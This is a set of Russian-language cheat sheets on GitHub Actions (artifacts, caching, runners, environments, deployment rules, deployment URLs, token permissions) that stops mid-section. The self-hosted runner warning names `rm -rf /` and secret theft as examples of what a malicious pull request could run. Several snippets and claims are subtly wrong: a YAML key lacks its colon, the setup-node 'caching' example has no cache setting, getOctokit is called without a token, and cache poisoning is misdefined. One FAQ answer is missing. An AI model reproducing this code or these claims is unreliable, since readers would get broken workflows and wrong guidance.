### ⚠️ Нюансы и "Подводные камни" (Senior Level)

1.  **Artifacts vs Cache (Главная путаница):**
    *   **Artifacts** — это **результат** работы (билд, отчеты). Они нужны для передачи данных *между шагами/работами* или для скачивания человеком.
    *   **Cache** — это **ускорение**. Он нужен, чтобы не качать `node_modules` или `pip` пакеты заново при каждом запуске. Кэш не предназначен для передачи артефактов между Job.

2.  **Retention Policy (Срок жизни):**
    *   По умолчанию GitHub хранит артефакты **90 дней**. Если у тебя огромный проект, это быстро забьет место и создаст шум. Всегда ограничивай `retention-days` для временных файлов (например, до 1–5 дней).

3.  **Scope (Область видимости):**
    *   Артефакт доступен только в рамках **одного конкретного запуска (Workflow Run)**. Ты не можешь легко забрать артефакт из вчерашнего запуска через `download-artifact` без костылей.

4.  **Размер и производительность:**
    *   Загрузка/выгрузка больших файлов (гигабайты) сильно замедляет пайплайн. Если файл слишком большой, подумай: а можно ли его сжать или не передавать через артефакты?

5.  **Версионность экшенов:**
    *   При переходе с `v3` на `v4` (для upload/download) изменился формат хранения. Если у тебя смешанные версии в одном workflow, ты можешь получить ошибки несовместимости. **Всегда используй актуальную версию.**

---

### ❓ FAQ (Часто задаваемые вопросы)

**В: Я загрузил артефакт в Job "Build", а в Job "Test" его нет. Почему?**
**О:** Скорее всего, ты забыл добавить `needs: build` в описание Job "Test". Без этого GitHub запускает их параллельно, и "Test" пытается скачать то, что еще не загружено.

**В: Можно ли упаковать сразу несколько папок в один артефакт?**
**О:** Да, в поле `path` можно указать маску (например, `dist/*` или даже список через новую строку), но лучше делать логически понятные именования.

**В: Что произойдет, если я загружу артефакт с тем же именем, что уже существует?**
**О:** В новых версиях экшена (`v4`) создание дубликатов ведет себя строже. Лучше всего давать уникальные имена или перезаписывать через четкую логику, чтобы не плодить мусор.

**В: Как мне посмотреть содержимое артефакта без скачивания?**
**О:** Напрямую в интерфейсе GitHub — никак. Тебе нужно либо скачать его, либо использовать скрипт для распаковки. Но ты можешь увидеть список созданных артефактов на странице конкретного запуска (Workflow Run).

# 🚀 Cheat Sheet: Caching in GitHub Actions

### 🎯 Зачем это нужно?
Каждый раз, когда запускается новый Workflow, GitHub выделяет тебе «чистую» виртуальную машину (Runner). В ней нет ничего, кроме базового софта. Если ты каждый раз будешь скачивать `node_modules`, `pip packages` или `maven dependencies` из интернета — твой CI будет медленным и дорогим. 
**Кэширование** позволяет сохранить эти зависимости и «подложить» их в следующую запуск.

---

### 🛠 Главный инструмент: `actions/cache`
Это стандартный экшен для управления кэшем. У него есть три критически важных параметра:

1.  **`path`**: Путь к папке или файлу, который мы хотим сохранить (например, `~/.npm` или `vendor/bundle`).
2.  **`key`**: Уникальный идентификатор твоего кэша. Если `key` совпадает с тем, что уже есть в системе — происходит **Cache Hit** (успех!). Если нет — **Cache Miss** (нужно качать заново).
3.  **`restore-keys`**: «Запасной план». Если точного совпадения по `key` не найдено, GitHub будет искать кэши, начинающиеся на эти строки (от более длинных к коротким).

---

### 🧠 Мастерство создания ключа (`key`)
**Золотое правило Senior-инженера:** Ключ должен меняться только тогда, когда меняются твои зависимости.

Если ты привяжешь ключ просто к названию ветки, то при добавлении новой библиотеки в `package.json` GitHub будет думать, что старый кэш всё еще актуален, и не обновит зависимости. Тебе нужно использовать **хэширование** файлов конфигурации.

**Правильный подход (на примере Node.js):**
```yaml
- name: Cache Node modules
  uses: actions/cache@v3
  with
    path: ~/.npm
    # Ключ меняется только если изменился package-lock.json
    key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
    # Если точного совпадения нет, ищем самый свежий кэш для этой ОС
    restore-keys: |
      ${{ runner.os }}-node-
```

---

### ⚠️ Важные нюансы (то, на чем валятся джуны)

1.  **Scope (Область видимости):** Кэши изолированы по веткам. Workflow из ветки `feature` может получить доступ к кэшу ветки `main`, но `main` **никогда** не получит кэш из `feature`. Это защита от подмены данных.
2.  **Размер имеет значение:** GitHub хранит кэши в пределах **10 ГБ на репозиторий**. Если лимит превышен, старые кэши начинают удаляться (LRU — Least Recently Used). Не пихай в кэш всё подряд (например, папку `build` или `dist`), кэшируй только то, что скачивается извне.
3.  **Cache Eviction:** GitHub сам чистит кэши, которые не использовались более 7 дней.
4.  **Immutable (Неизменяемость):** Ты не можешь «обновить» существующий кэш. Ты можешь только создать новый с новым ключом. Старый останется лежать в хранилище, пока не удалится сам.

---

  ### 💡 Профессиональный совет: Использование встроенных экшенов
Для популярных языков (Setup Node, Setup Python, Setup Java) уже есть встроенная поддержка кэширования прямо в `actions/setup-xxx`. Это проще и надежнее, чем настраивать `actions/cache` вручную.

**Пример (Best Practice):**
```yaml
- uses: actions/setup-node@v3
  with:
    node-version: '18'
```

# 🧹 Стратегии очистки кэша (Cache Eviction) в GitHub Actions

Когда мы говорим об очистке кэша, важно понимать: **в GitHub Actions ты не управляешь удалением кэша напрямую через YAML**. Ты управляешь тем, как кэш *создается*, а GitHub сам решает, когда его *выкинуть*. 

Твоя задача как инженера — настроить систему так, чтобы "мусор" не забивал лимиты и не приводил к деградации скорости сборки.

### 1. Основные механизмы очистки (Как это делает GitHub)

GitHub использует два главных механизма, чтобы поддерживать порядок в хранилище:

*   **TTL (Time To Live) — Правило 7 дней:** Любой кэш, к которому не было обращения в течение **7 дней**, автоматически удаляется. Это защита от "забытых" веток и старых билдов.
*   **LRU (Least Recently Used) — Принцип наименьшей популярности:** У каждого репозитория есть общий лимит кэша (стандартно **10 ГБ** на репозиторий). Если ты превышаешь этот лимит, GitHub начинает удалять самые старые кэши, которые использовались реже всего, чтобы освободить место для новых.

### 2. Проблема "Загрязнения" кэша (Cache Poisoning)
Это ситуация, когда в кэш попали битые или неверные данные (например, после неудачного обновления зависимости). Поскольку GitHub не удаляет старый кэш сам, пока не сработает TTL или лимит, твой пайпнлайн может продолжать падать, используя "отравленный" кэш.

**Как бороться:**
*   **Версионирование ключа (Cache Key Versioning):** Самый эффективный метод. Добавляй префикс к ключу кэша (например, `v1-`, `v2-`). Если ты понял, что кэш испорчен — просто смени `v1` на `v2` в workflow. Это заставит GitHub создать новый кэш и со временем удалит старый по правилу LRU/TTL.

### 3. Стратегии управления объемом (Best Practices)

Чтобы не упереться в лимит 10 ГБ и не спровоцировать массовое удаление полезных данных:

*   **Атомарность ключей:** Ключ должен быть максимально специфичным (`hashFiles('package-lock.json')`). Чем точнее ключ, тем меньше шансов на коллизии и лишний объем.
*   *Не кэшируй всё подряд:* Не стоит кэшировать папки, которые весят много, но меняются при каждом запуске (например, логи или временные артефакты сборки). Кэшируй только то, что реально долго устанавливается (node_modules, pip packages, maven dependencies).
*   **Мониторинг:** Периодически заглядывай в раздел `Actions -> Caches` в настройках репозитория. Там видно, сколько места занимает каждый кэш и когда он был использован.

**В: Что произойдет, если я превышу лимит 10 ГБ?**
**О:** GitHub не выдаст ошибку в workflow. Он просто начнет удалять самые старые кэши из твоего репозитория по алгоритму LRU, чтобы освободить место для нового кэша. Твой новый кэш сохранится, но "старички" могут пропасть.

**В: Как мне принудительно очистить весь кэш в репозитории?**

1.  **Вручную через UI:** Зайди в `Settings -> Actions -> Caches` и удали нужные записи кнопкой (корзиной).
2.  **Через API/CLI:** Можно написать скрипт на GitHub CLI (`gh cache delete`), который массово вычистит старые кэши. Это полезно для автоматизации очистки "мусорных" веток.

**В: Почему мой кэш не обновляется, хотя я изменил зависимости?**

**В: Можно ли настроить TTL больше 7 дней?**
**О:** Нет, это глобальная политика GitHub. Ты можешь только управлять тем, как часто ты *обращаешься* к кэшу, чтобы продлить ему жизнь (каждое обращение сбрасывает счетчик 7 дней).

# 🚀 Шпаргалка: GitHub-hosted Runners

**GitHub-hosted Runners** — это виртуальные машины, которые GitHub предоставляет тебе «под ключ». Тебе не нужно думать о настройке сервера, обновлении ОС или масштабировании. Ты просто говоришь: «Мне нужен Ubuntu», и через секунду у тебя есть чистая среда для запуска кода.

### 🛠 Как это работает
Каждый раз, когда запускается твой Workflow, GitHub выделяет **новую, абсолютно чистую** виртуальную машину. После завершения работы (успешного или нет) машина уничтожается вместе со всеми файлами, которые ты там создавал.

### ✅ Плюсы (Почему это круто)
1.  **Zero Maintenance:** Не нужно обновлять патчи безопасности, настраивать Docker или чистить диск от старых билдов.
2.  **Изоляция:** Каждый запуск — это «стерильная» сречка. Никаких конфликтов между разными запусками пайплайна.
3.  **Масштабируемость:** Тебе не нужно ждать, пока освободится сервер. GitHub запустит 10, 20 или 50 раннеров одновременно, если это нужно.
4.  **Предустановленный софт:** В образы уже вшиты сотни инструментов: `git`, `docker`, `python`, `node`, `java`, `dotnet` и т.д. Тебе не нужно тратить 5 минут билда на установку базового CLI.

### ❌ Минусы и Ограничения (Где можно «приплыть»)
1.  **Стоимость:** За минуты использования этих раннеров ты платишь (или тратишь лимит бесплатных минут). Длинные и тяжелые тесты могут быстро опустошить бюджет.
2.  **Ограниченное железо:** Ты не можешь выбрать «мне нужно 128 ГБ оперативной памяти». Ты ограничен стандартными конфигурациями (CPU/RAM фиксированы для каждого типа ОС).
3.  **Дисковое пространство:** Диск не бесконечный. Если твой билд качает тяжелые Docker-образы или генерирует огромные логи, ты можешь упереться в `No space left on device`.
4.  **Сложность доступа к внутренним ресурсам:** Если твой сервис крутится внутри закрытого корпоративного VPN, GitHub-hosted Runner не увидит его «из коробки». Для этого нужны сложные сетевые костыли или переход на Self-hosted.

### 💡 Senior Tips (Нюансы)
*   **Clean Slate Policy:** Помни, что всё, что ты скачал в одном `job`, исчезнет после его завершения. Если тебе нужно передать файл из одного Job в другой — используй **Artifacts**.
*   **Caching — твой лучший друг:** Чтобы не перекачивать `node_modules` или `pip packages` каждый раз (и не тратить минуты), всегда используй `actions/cache`. Это критически важно для экономии денег и времени.
*   **Timeout:** По умолчанию таймаут задания — 6 часов. Если твой процесс завис, он будет «сжигать» твои деньги/минуты все 6 часов. Всегда явно ограничивай `timeout-minutes` в своих workflow.

# 🛠 Шпаргалка: Self-hosted Runners

**Self-hosted Runner** — это твой собственный сервер (или виртуальная машина/контейнер), который ты подключаешь к GitHub, чтобы он выполнял задачи (jobs) вместо стандартных серверов GitHub.

### 🎯 Зачем это нужно? (Use Cases)
Если возможностей стандартных `github-hosted` раннеров тебе мало, ты переходишь на свои:
1.  **Специфическое железо:** Тебе нужна GPU для обучения нейросетей или мощный CPU/много RAM для тяжелых билдов.
2.  **Доступ к внутренней сети:** Твой сервер находится внутри корпоративного VPN/VPC, и только он может «дотянуться» до внутренних баз данных или серверов деплоя.
    *   *Пример:* Деплой в закрытый Kubernetes-кластер без открытия портов наружу.
3.  **Экономия:** Если у тебя огромный объем задач, платить за минуты GitHub может быть дороже, чем держать свой сервер.
4.  **Предварительно настроенное окружение:** На раннере уже стоят 50 ГБ тяжелых зависимостей, Docker-образы или специфический софт (например, старая версия macOS или Windows с лицензионным ПО). Это экономит время на `setup` шагах.

### ⚙️ Как это работает (High-level)
Ты скачиваешь небольшой агент (application) от GitHub на свой сервер, запускаешь его, и он устанавливает долгоживущее соединение (через HTTPS) с GitHub. Когда появляется задача, GitHub «пушит» её раннеру. **Важно:** Раннер сам стучится к GitHub, тебе не нужно открывать входящие порты (Inbound rules) на своем сервере.

### ⚠️ Критические нюансы и безопасность (Senior Insights)
Это самая важная часть. Self-hosted раннеры — это потенциальная дыра в безопасности.

1.  **Опасность Public Repositories:** **НИКОГДА** не используй self-hosted раннеры для публичных репозиториев. Любой злоумышленник, прислав Pull Request, может запустить вредоносный код (например, `rm -rf /` или кражу секретов) прямо на твоем сервере.
2.  **Загрязнение окружения (Workspace Pollution):** В отличие от облачных раннеров, которые каждый раз создаются «с нуля», self-hosted раннер — это долгоживущая машина. Файлы от предыдущего запуска могут остаться и повлиять на следующий.
/ *Решение:* Всегда делай `git clean` или используй эфемерные (одноразовые) раннеры.
3.  **Управление зависимостями:** Если ты установил софт через `apt-get` прямо на раннер, это «магическое состояние». Через месяц никто не вспомнит, почему билд проходит.
    *   *Решение:* Используй Docker-контейнеры внутри раннера (Container Jobs).

### 🚀 Продвинутые стратегии масштабирования
Если задач становится много, один сервер не справится. Что делать?
*   **Labels (Метки):** Ты можешь пометить раннеры тегами: `linux`, `gpu`, `high-mem`. В YAML указывай `runs-on: [self-hosted, gpu]`.
*   **ARC (Actions Runner Controller):** Это "золотой стандарт" для энтерпрайза. Он позволяет запускать раннеры внутри Kubernetes. Когда появляется задача — K8s поднимает новый под с раннером, когда задач нет — удаляет его. Это решает проблему чистоты окружения и масштабируемости.

**В: Можно ли использовать self-hosted раннер для запуска Docker-команд?**
**О:** Да, но будь осторожен. Если процесс внутри контейнера получит доступ к `docker.sock` хостовой машины, он сможет захватить контроль над всем твоим сервером. Используй Rootless Docker или изолированные среды.

# 🚀 Шпаргалка: Ephemeral Runners (Эфемерные раннеры)

### 💡 Что это такое?
**Ephemeral Runner** — это «одноразовый» исполнитель задач. Его жизненный цикл строго ограничен: он запускается, выполняет **ровно один Job** и тут же уничтожается (удаляется из системы/контейнер гаснет).

Представь разницу между арендованным автомобилем (Ephemeral) и своим собственным (Persistent). В арендованном ты не оставишь забытые вещи или мусор, потому что после тебя его заберет другой человек, а машина вернется в парк чистой.

---

### 🛠 Зачем это нужно? (Основные преимущества)

1.  **Безопасность (Security Hardening):** Это главный аргумент. Если злоумышленник взломает процесс во время выполнения Job и оставит «бэкдор» или вредоносный файл в системе, при следующем запуске раннер будет создан с нуля. Вредоносный код не выживет.
2.  **Чистота окружения (Clean State):** Ты застрахован от ситуации «на предыдущем билде я установил библиотеку, и теперь всё работает». Каждый раз — абсолютно чистая ОС. Это исключает «дрейф конфигурации» (configuration drift).
3.  **Масштабируемость (Scalability):** Идеально подходит для Kubernetes. С помощью **ARC (Actions Runner Controller)** можно настроться так, чтобы при появлении задачи в очереди создавался новый Pod, а после завершения — удалялся. Ты платишь только за ресурсы, когда идет работа.
4.  **Экономия ресурсов:** Нет смысла держать 10 мощных серверов простаивающими 24/7, если можно запускать их по требованию.

---

### ⚠️ Нюансы и «Подводные камни» (Senior Level)

*   **Проблема State (Состояния):** Ты **не можешь** полагаться на то, что файлы, скачанные или созданные в Job №1, останутся на диске для Job №2. 
    *   *Решение:* Используй `actions/cache` для зависимостей и `upload-artifact` / `download-artifact` для передачи артефактов между джобами.
*   **Latency (Задержка на запуск):** Поднятие нового виртуального экземпляра или Pod'а в Kubernetes занимает время (от секунд до минут). Если твои тесты идут 10 секунд, а раннер поднимается 2 минуты — это неэффективно.
    *   *Решение:* Тщательно подбирай размер образов и используй легковесные технологии (например, контейнеры вместо тяжелых VM).
*   **Сложность инфраструктуры:** Тебе нужна система оркестрации (например, тот же ARC в K8s), которая будет слушать GitHub и уметь «поднимать» эти раннеры. Это требует навыков управления кластером.

| Сценарий | Тип раннера | Почему? |
| :--- | :--- | :--- |
| **Публичные репозитории (Open Source)** | **Ephemeral** | Максимальная безопасность, защита от инъекций кода в пайплайн. |
| **Высоконагруженные CI/CD (много коммитов)** | **Ephemeral** | Автомасштабирование под нагрузку через K8s. |

### ❓ FAQ (Частые вопросы)

**В: Можно ли использовать Ephemeral Runner для кэширования Docker-слоев?**
**О:** Напрямую — нет, так как после джоба слой исчезнет. Тебе нужно либо использовать внешний реестр (Registry), либо настроить persistent volume для кэша в твоем оркестраторе (например, в K8s), но это уже усложнение архитектуры.

**В: Что такое ARC и стоит ли его внедрять?**
**О:** **Actions Runner Controller** — это стандарт де-факто для управления эфемерными раннерами в Kubernetes. Если у тебя уже есть K8s, внедряй обязательно. Это даст тебе "бесконечную" масштабируемость.

**В: Как передать секреты, если раннер удаляется?**
**О:** Секреты не хранятся на раннере. Они передаются через контекст GitHub (`secrets.MY_TOKEN`) в момент выполнения шага. Раннеру они нужны только «в памяти» во время работы конкретного процесса.

**В: Как бороться с долгим запуском (Cold Start)?**
**О:** Используй "pre-baked" образы. Вместо того чтобы внутри раннера делать `apt-get install`, создай Docker-образ, где уже установлены все нужные зависимости, и используй его как основу для запуска эфемерного раннера.

# 🛠 Шпаргалка: Environments (Окружения) в GitHub Actions

### 💡 Что это такое?
Если коротко: **Environment** — это логическая изоляция ресурсов внутри твоего репозитория. Это не просто «название», а полноценный объект в GitHub, который позволяет разделять конфигурации, секреты и правила доступа для разных стадий жизненного цикла приложения (например: `development`, `staging`, `production`).

Представь, что это «защищенные зоны». Ты можешь сказать: «В зону `production` нельзя заходить без одобрения тимлида, а ключи от базы данных там свои собственные».

---

### 🔑 Ключевые возможности

#### 1. Environment Secrets & Variables (Область видимости)
Это главная причина использовать Environments. Вместо того чтобы плодить секреты типа `PROD_DB_PASSWORD` и `STAGING_DB_PASSWORD`, ты создаешь один секрет `DB_PASSWORD`, но в разных окружениях у него будут **разные значения**.
*   **Scope (Область):** Секреты окружения имеют приоритет над репозиторными секретами. Если в репозитории и в Environment есть одинаковый ключ, workflow возьмет тот, что в Environment.

#### 2. Deployment Protection Rules (Правила защиты)
Это «вышибалы» на входе в твой деплой:
*   **Required Reviewers:** Требует ручного подтверждения (Manual Approval). Workflow остановится и будет ждать, пока назначенный человек не нажмет кнопку "Approve".
*   **Wait Timer:** Задержка перед началом выполнения. Полезно для автоматизированного тестирования или «прогрева» инфраструктуры.
*   **Deployment Branches:** Ограничение по веткам. Например, в `production` можно деплоить только из ветки `main`.

#### 3. Deployment History & Tracking
GitHub ведет журнал: какой коммит, какой workflow и какой пользователь успешно (или нет) задеплоил код в конкретное окружение. Это критически важно для аудита и быстрого отката (rollback).

---

### 🛠 Как это выглядит в YAML
Чтобы привязать Job к окружению, используется ключевое поле `environment`.

```yaml
jobs:
  deploy-prod:
    runs-on: ubuntu-latest
    # Вот здесь мы связываем задачу с конкретной средой
    environment: production 
    steps:
      - name: Deploy to Production
        run: |
          echo "Deploying using secret: $DB_PASSWORD"
          # Здесь $DB_PASSWORD будет взят именно из Environment 'production'
```

---

### ⚠️ Нюансы и «грабли» (Senior Tips)

1.  **Concurrency (Конкурентность):** Это критический момент. Если два пайплайна одновременно попытаются деплоить в один и тот же `environment`, может произойти каша (например, один затрет файлы другого). 
    *   *Решение:* Всегда используй `concurrency` с привязкой к имени окружения.
    ```yaml
    concurrency:
      group: deployment-${{ github.workflow }}-${{ github.ref }}
      cancel-in-progress: true # Отменяет старый деплой, если пришел новый
    ```

2.  **Создание Environments:** На уровне GitHub Actions ты не можешь *создать* окружение прямо в YAML (ты можешь только *ссылаться* на него). Окружения должны быть созданы заранее в настройках репозитория (Settings -> Environments) или через API/Terraform.

3.  **Разница между Environment Variables и Secrets:** 
    *   `env` в YAML — это переменные внутри самого файла.
    *   `Variables` в Settings -> Environments — это константы, доступные через контекст `vars`.
    *   Используй `vars` для нечувствительных данных (URL API, имя бакета), а `secrets` — для паролей и ключей.

4.  **Infrastructure as Code (IaC):** В больших компаниях никто не создает окружения руками через UI. Используйте Terraform или GitHub API, чтобы окружения создавались автоматически вместе с инфраструктурой.

### ❓ FAQ (Частые вопросы)

**В: Можно ли использовать один и тот же workflow для разных окружений?**
**О:** Да, это лучший паттерн. Ты используешь один шаблон, а через `strategy/matrix` или параметры запуска (`inputs`) передаешь имя нужного `environment`.

**В: Что если я укажу `environment: production`, но не создал его в настройках репозитория?**
**О:** GitHub создаст его «на лету» (в некоторых случаях), но у него **не будет** никаких защитных правил и секретов. Это опасно, так как деплой пойдет без проверки и с пустыми переменными.

**В: Как реализовать ручное подтверждение (Manual Approval)?**
**О:** Тебе нужно зайти в *Settings -> Environments -> [Твое окружение]* и добавить "Required reviewers". В самом YAML ничего дополнительно писать не нужно, кроме названия `environment`.

**В: Чем `environment` отличается от обычного `job`?**
**О:** `job` — это просто набор инструкций. `environment` — это контекст (секреты + правила + история), который этот `job` использует. Один и тот же `job` может запускаться в разных `environments`.

# 🛡️ Шпаргалка: Deployment Protection Rules (DPR)

**Deployment Protection Rules** — это «контрольно-пропускной пункт» (gatekeeper) для твоего кода. Если Workflow — это конвейер, то DPR — это автоматизированный или ручной затвор, который не дает деплою проехать дальше, пока не будут выполнены определенные условия.

Эти правила привязываются **не к самому коду (YAML)**, а к **Environments** (Окружениям) в настройках репозитория GitHub.

---

### 🏗️ Основные механизмы (Types of Rules)

В GitHub есть три основных способа контролировать деплой:

#### 1. Required Reviewers (Ручное одобрение)
Самый популярный метод. Деплой приостанавливается, пока назначенный человек (или группа людей) не нажмет кнопку **"Review"**.
*   **Зачем:** Чтобы Senior или Lead Engineer проверил, что тесты прошли и изменения безопасны перед тем, как они попадут в `production`.
*   **Нюанс:** Если ревьюер не нажмет "Approve", джоба будет висеть в статусе `Waiting` до истечения таймаута или ручной отмены.

#### 2. Wait Timer (Таймер ожидания)
Автоматическая задержка перед началом деплоя.
*   **Зачем:** Дать время на "остывание" после тестов, или использовать как буфер между стейджингом и продакшеном.
*   **Нюанс:** Это не проверка безопасности, это просто искусственная пауза.

#### 3. Custom Deployment Protection Rules (Продвинутый уровень)
Это использование **GitHub Apps**. Ты можешь написать внешнее приложение, которое будет принимать решение: "Пускать или нет".
*   **Зачем:** Интеграция с внешними системами. Например, проверка: *"Закрыта ли задача в Jira?"* или *"Прошел ли сканер уязвимостей SonarQube?"*.
*   **Нюанс:** Это требует написания кода и хостинга вашего сервиса-проверщика.

---

### 🛠️ Как это выглядит в коде (YAML)

Правила настраиваются в интерфейсе GitHub, но чтобы они сработали, твой Workflow должен **явно ссылаться** на конкретное окружение через ключевое слово `environment`.

```yaml
jobs:
  deploy-to-prod:
    runs-on: ubuntu-latest
    # Вот эта магия связывает джобу с правилами в настройках GitHub
    environment: production 
    steps:
      - name: Deploying to Production
        run: |
          echo "Если в настройках 'production' стоит Reviewer, этот шаг не начнется, пока его не одобрят."
          ./deploy.sh
```

---

### 💡 Советы от Senior (Nuances & Best Practices)

1.  **Принцип разделения:** Никогда не ставь `Required Reviewers` на ветку `develop` или `staging`. Это убьет скорость разработки (Velocity). Используй их **только** для критических окружений (`production`, `pre-prod`).
2.  **Environment vs Branch:** Помни, что правила живут в *Environment*. Если ты создашь новое окружение `production-new` и забудешь настроить там правила — твой деплой пролетит без проверок.
3.  **Concurrency (Конкурентность):** При использовании DPR всегда настраивай `concurrency`. Если два человека одновременно запустят деплой в `production`, один должен ждать или отменяться, иначе возникнет состояние гонки (race condition) и поломка инфраструктуры.
4.  **Автоматизация через Apps:** Если компания большая, не полагайтесь на людей (Reviewers). Пытайтесь переносить проверки (Security, QA) в `Custom Deployment Protection Rules` через GitHub Apps. Люди — это узкое место (bottleneck).

### ❓ FAQ (Частые вопросы)

**В: Что произойдет с остальными шагами Workflow, если деплой застрял на ожидании ревьюера?**
**О:** Все последующие шаги в этой джобе и все зависимые джобы (те, у которых есть `needs: [deploy-job]`) будут находиться в состоянии ожидания. Workflow не считается упавшим, он просто "в процессе".

**В: Можно ли назначить бота в качестве ревьюера?**
**О:** Да, но бот должен иметь доступ к репозиторию. Однако, если бот сам инициирует деплой, это может создать бесконечный цикл, если не настроить фильтрацию событий.

** В: Где именно в интерфейсе GitHub искать эти настройки?**
**О:** `Settings` -> `Environments` -> Выбираешь нужнотое окружение (или создаешь новое) -> Там увидишь чекбоксы `Required reviewers` и `Wait timer`.

**В: Нужна ли платная подписка для использования Custom Protection Rules?**
**О:** Да, использование Custom Deployment Protection Rules через GitHub Apps — это фича уровня **GitHub Enterprise**. Для обычных ревьюеров (человек-человек) достаточно планов Pro/Team.

# 🚀 Шпаргалка: Deployment URLs

**Deployment URLs** — это не просто «ссылочки». Это метаданные в GitHub, которые связывают конкретный коммит или Pull Request с работающей версией вашего приложения (например, Preview Environment, Staging или Production).

### 🎯 Зачем это нужно?
Когда ты делаешь Deployment URL, ты даешь команде (QA, Product Manager, Reviewers) возможность одним кликом перейти из PR сразу в рабочую среду, где можно потыкать фичу. Это убирает вопрос: *"А где мне посмотреть, как работает этот код?"*.

### 🛠 Как это работает (Механика)
Deployment URL не берется «из воздуха». Он является частью **Deployment Status**. Когда GitHub выполняет задачу в рамках определенного `environment`, он фиксирует статус этого окружения.

1.  **Связь с Environment:** В твоем workflow ты указываешь `environment: name`.
2.  **Регистрация URL:** Чтобы ссылка появилась в интерфейсе PR, нужно передать её через GitHub API или специализированные Action.
3.  **Визуализация:** После успешного деплоя в PR появляется статусная метка (например, `Checks passed`) и кнопка **"View deployment"**.

### 🏗 Реализация: Два пути

#### 1. Простой путь (через стандартный Workflow)
Если ты просто используешь `environment` в Job, GitHub будет знать, что деплой *происходит*, но он не всегда автоматически подставит кликабельную ссылку на твой динамический URL (например, на Vercel или Netlify), если это не настроено на стороне сервиса.

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: preview  # Указываем окружение
    steps:
      - name: Deploy to Preview
        run: |
          # Команда деплоя (например, в S3 или Cloud Run)
          echo "Deploying..."
```

#### 2. Продвинутый путь (через GitHub API / GitHub Script)
Чтобы гарантированно получить кликабельную ссылку в интерфейсе PR, Senior-инженеры используют манипуляцию с **Deployment API**. Самый быстрый способ — использовать `actions/github-script`.

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Create Deployment and Set URL
        uses: actions/github-script@v6
        with:
          script: |
            const octokit = github.getOctokit();
            // 1. Создаем деплой
            const deployment = await octokit.rest.repos.createDeployment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              ref: context.sha,
              environment_url: 'https://preview-branch-123.myapp.com', // Тот самый URL!
              auto_merge: false,
              required_status_checks: []
            });
            // 2. Создаем статус (чтобы ссылка стала активной)
            await octokit.rest.repos.createDeploymentStatus({
              owner: context.repo.owner,
              repo: context.repo.repo,
              deployment_id: deployment.data.id,
              state: 'success',
              environment_url: 'https://preview-branch-123.myapp.com'
            });
```

### ⚠️ Нюансы и "Подводные камни" (Senior Tips)

*   **Ephemeral Environments (Preview Envs):** Идеальный кейс — создание временного окружения на каждый PR. **Но помни:** если ты создаешь URL для каждой ветки, тебе *обязательно* нужен workflow на удаление (Cleanup), иначе твои ресурсы (и деньги) закончатся очень быстро.
*   **Traceability (Прослеживаемость):** Всегда связывай `environment_url` с конкретным `ref` (коммитом). Это позволяет в истории деплоев видеть, какой именно код сейчас крутится на стейджинге.
*   **Security:** Не передавай в URL чувствительные данные (токены, ID пользователей). URL должен быть публичным для участников репозитория.
*   **Deployment Protection Rules:** Если ты используешь Deployment URLs вместе с `environment` в GitHub Enterprise/Pro, ты можешь настроить **Manual Approval**. Это значит: "Пока Senior не нажмет кнопку 'Approve', деплой на Production не пойдет".

### ❓ FAQ (Частые вопросы)

**В: Где именно я увижу эту ссылку?**
**О:** В трех местах: 1) В списке коммитов (рядом с хешем), 2) В Pull Request (в блоке Checks), 3) На вкладке "Environments" в настройках репозитория.

**В: Что будет, если деплой упадет?**
**О:** Если ты используешь API для создания статуса, тебе нужно отправить статус `failure`. Тогда в PR вместо зеленой галочки и ссылки на Preview будет красный крестик. Это критически важно для автоматизации.

**В: Можно ли использовать один и тот же URL для всех веток?**
**О:** Можно, но это плохая практика (Anti-pattern). Смысл Deployment URL — в изоляции. Если все ветки будут ссылаться на один `staging.myapp.com`, разработчики будут перезатирать друг друга, и ты не сможешь тестировать фичи параллельно.

**В: Поможет ли это в автоматизации тестирования?**
**О:** Да! Твои E2E-тесты (например, Playwright или Cypress) могут брать этот `environment_url` из контекста GitHub Actions и запускать тесты именно на той версии приложения, которую ты только что задеплоил.

# 🔐 Тема: Permissions (Права доступа)

В GitHub Actions главным героем является **`GITHUB_TOKEN`**. Это временный секрет, который создается автоматически при каждом запуске workflow. Если этот токен украдут или если твой workflow взломают через сторонний Action, злоумышленник получит доступ к твоему репозиторию. 

**Permissions** — это механизм управления тем, что именно этот токен может делать (читать код, писать комментарии в PR, создавать релизы и т.д.).

### 1. Главный принцип: Least Privilege (Наименьшие привилегии)
Золотое правило Senior-инженера: **Давай токену ровно столько прав, сколько ему нужно для выполнения конкретной задачи, и ни граммом больше.** 
Если тебе нужно только протестировать код — используй `read`. Если нужно запушить теги — используй `write`.

### 2. Уровни настройки
Права можно настраивать в трех местах (в порядке приоритета):

1.  **На уровне репозитория (Repository Settings):** Глобальная настройка для всех workflow. Можно разрешить "Read/Write" по умолчанию или ограничить всё до "Read-only". *Совет: Всегда ставь Read-only на уровне репозитория.*
2.  **На уровне Workflow (Top-level):** В самом начале YAML-файла. Определяет права для всех jobs в этом файле.
3.  **На уровне Job:** Самый точный способ. Ты можешь дать одной джобе право писать в Packages, а другой — только читать содержимое репозитория.

### 3. Синтаксис и основныеscopes
Права описываются парами `scope: type`, где тип — это либо `read`, либо `write`.

**Основные области (Scopes):**
*   `contents`: Чтение/запись кода, тегов, коммитов.
*   `pull-requests`: Работа с PR (комментарии, закрытие, метки).
*   `issues`: Управление тикетами в Issues.
*   `packages`: Доступ к GitHub Packages (Docker, npm и т.д.).
*   `deployments`: Статус деплоя.
*   `pages`: Работа с GitHub Pages.
*   `actions`: Управление запуском других workflow.

**Пример правильной настройки:**
```yaml
name: Secure Workflow

# На уровне всего workflow задаем базовый минимум (все остальное станет 'none')
permissions:
  contents: read
  pull-requests: write

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4 # Работает, так как есть contents: read
      
      - name: Comment on PR
        run: |
          # Этот шаг сработает, так как есть pull-requests: write
          gh pr comment ${{ github.event.pull_request.number }} --body="Tests passed!"
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  deploy:
    needs: test
    runs-on: ubuntu-latest
    # Переопределяем права специально для джобы деплоя
    permissions:
      contents: write
      packages: write
    steps:
      - name: Push Docker Image
        run: echo "Pushing to GHCR..."
```

### 4. ⚠️ Главная ловушка (The "All or Nothing" Trap)
Это ошибка, на которой горят все. 

